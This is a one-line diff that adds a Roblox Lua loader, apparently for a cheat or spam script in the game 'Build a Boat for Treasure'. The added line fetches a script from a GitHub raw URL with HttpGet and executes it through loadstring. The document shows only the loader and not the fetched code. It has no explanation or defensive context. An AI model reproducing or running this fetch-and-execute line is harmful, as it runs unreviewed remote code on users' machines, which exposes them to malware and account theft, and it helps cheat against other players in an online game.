@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/build-a-boat-for-treasure-spam2-4bhwb4rqloem4l.lua"))()
